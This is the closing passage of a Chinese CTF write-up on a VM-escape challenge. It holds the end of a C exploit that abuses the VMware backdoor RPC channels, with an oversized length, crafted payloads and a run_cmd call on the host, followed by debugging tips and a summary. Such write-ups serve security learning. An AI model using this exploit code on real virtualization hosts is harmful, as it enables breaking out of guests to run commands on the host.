    printf("leak2 success\n");
    /***
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res)`{`
        printf("fail to recv data len\n");
        return;
    `}`
    ***/
    //channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&amp;res);
    if(!res)`{`
        printf("fail to recv finish2\n");
        return;
    `}`
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&amp;pay1,&amp;res);
    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&amp;res);
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`
    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;pay2,&amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;pay3,&amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&amp;res);
    run_cmd(s4);
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`
`}`
void main()`{`
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    setvbuf(stdin,0,2,0);
    leak();
    printf("text base :%p",text);
    getchar();
    exploit();
`}`
```



## tips

​ 在调试的时候会遇到一个问题：如果直接在被攻击机编译运行exp，运行到断点处会卡死，导致鼠标没法从虚拟机中拖出来。所以可以ssh连接到被攻击机，远程运行exp避免这个问题；或者可以在exp中加一行sleep防止卡在虚拟机里。<br>
​ 另外调试时最好将虚拟机最小化，防止不小心把鼠标点到虚拟主机中卡死。



## 总结

​ 第一次调试虚拟机逃逸的题目，逆向分析的过程花了很大一部分时间，最后编写EXP、调试的过程大部分工作都是仿照[Real World CTF 2018 Finals Station-Escape](https://zhuanlan.zhihu.com/p/52140921)进行，最后成功弹出计算器还是有些小激动的，也算是对利用backdoor这个攻击面的第一次尝试，收获很多。
